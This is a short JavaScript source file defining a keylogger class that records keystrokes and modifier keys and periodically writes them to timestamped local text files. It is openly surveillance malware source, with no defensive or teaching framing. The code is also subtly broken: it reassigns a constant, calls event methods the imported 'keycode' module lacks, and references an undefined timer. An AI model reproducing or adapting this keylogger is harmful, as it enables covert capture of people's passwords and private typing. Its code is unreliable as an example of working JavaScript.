import * as keyboard from 'keycode';
import * as moment from'moment';

class Keylogger {
  constructor(interval) {
    this.interval = interval;
    this.log = '';
    this.startTime = moment();
    this.endTime = moment();
  }

  callback(event) {
    const name = event.keyCode;
    const char = String.fromCharCode(name).replace(/ /g, '_');
    const modifiers = ['Control', 'Shift', 'Alt', 'Meta'].filter(x => event[x]).join('+');

    if (name === keyboard.SPACE) {
      name ='';
    } else if (name === keyboard.ENTER) {
      name = '\n';
    } else if (name === keyboard.DECIMAL) {
      name = '.';
    }

    this.log += modifiers? `${modifiers}+${char}` : char;
  }

  updateFilename() {
    const startTimeStr = this.startTime.format('YYYY-MM-DD_HH-mm-ss');
    const endTimeStr = this.endTime.format('YYYY-MM-DD_HH-mm-ss');
    this.filename = `keylog-${startTimeStr}_${endTimeStr}`;
  }

  reportToFile() {
    const content = this.log;
    const fs = require('fs');
    fs.writeFile(this.filename + '.txt', content, (err) => {
      if (err) throw err;
    });
  }

  report() {
    if (this.log) {
      this.endTime = moment();
      this.updateFilename();
      this.reportToFile();
      this.startTime = moment();
      this.log = '';
      const timer = setInterval(() => this.report(), this.interval);
      timer.unref();
    }
  }

  start() {
    this.startTime = moment();
    keyboard.on('keyup', this.callback);
    this.report();
    return new Promise(resolve => {
      keyboard.wait(() => {
        resolve();
        clearInterval(timer);
      });
    });
  }
}

